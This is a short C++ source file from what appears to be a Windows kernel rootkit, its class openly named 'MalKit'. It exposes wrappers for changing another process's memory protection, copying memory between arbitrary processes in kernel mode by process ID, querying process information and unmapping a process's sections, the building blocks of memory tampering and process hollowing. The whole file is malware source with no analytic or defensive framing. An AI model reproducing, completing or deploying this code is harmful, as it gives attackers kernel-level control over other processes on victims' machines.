#include "rootkit.hpp"
#include "debug.hpp"

NTSTATUS Rootkit::MalKit::ZwProtectVirtualMemory(zwpvm_t* zwpvm)
{
	return Rootkit::ZwProtectVirtualMemory(
		zwpvm->ProcessHandle, 
		zwpvm->BaseAddress, 
		zwpvm->NumberOfBytesToProtect, 
		zwpvm->NewAccessProtection, 
		zwpvm->OldAccessProtection);
}

NTSTATUS Rootkit::MalKit::MmCopyVirtualMemory(mcvm_t* mcvm)
{
	SIZE_T out;
	PEPROCESS sourceProcess, targetProcess;
	Rootkit::PsLookupProcessByProcessId(ULongToHandle(mcvm->SourceProcessPid), &sourceProcess);
	Rootkit::PsLookupProcessByProcessId(ULongToHandle(mcvm->TargetProcessPid), &targetProcess);
	
	return Rootkit::MmCopyVirtualMemory(
		sourceProcess, 
		mcvm->SourceAddress, 
		targetProcess, 
		mcvm->TargetAddress, 
		mcvm->BufferSize, 
		KernelMode, 
		&out);
}

NTSTATUS Rootkit::MalKit::ZwQueryInformationProcess(zqip_t* zqip)
{
	return Rootkit::ZwQueryInformationProcess(
		zqip->ProcessHandle,
		zqip->ProcessInformationClass,
		zqip->ProcessInformation,
		zqip->ProcessInformationLength,
		zqip->ReturnLength);
}

NTSTATUS Rootkit::MalKit::ZwUnmapViewOfSection(zuvos_t* zuvos)
{
	return Rootkit::ZwUnmapViewOfSection(
		zuvos->ProcessHandle,
		zuvos->BaseAddress
	);
}